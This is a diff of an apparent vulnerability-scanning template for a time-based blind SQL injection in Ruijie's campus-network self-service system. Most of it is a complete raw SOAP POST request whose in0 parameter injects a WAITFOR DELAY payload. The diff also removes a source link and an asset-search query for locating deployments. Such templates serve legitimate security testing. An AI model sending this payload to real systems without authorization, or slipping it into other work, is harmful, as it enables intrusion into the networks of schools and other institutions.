@@ -3,14 +3,8 @@ info:
   name: 锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0c95679254636fad8a185f24703bc91f
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0c95679254636fad8a185f24703bc91f
-    fofa: + hunter`app="校园网自助服务系统"`
 http:
 - raw:
   - "POST /selfservice/service/operatorReportorRoamService HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394\nUpgrade-Insecure-Requests: 1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 399\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ser=\"http://service.webservice.common.spl.ruijie.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ser:findOperatorOnlineUserCount24Hours>\n         <!--type: string-->\n         <ser:in0>gero et';WAITFOR DELAY '0:0:5'--</ser:in0>\n\n      </ser:findOperatorOnlineUserCount24Hours>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
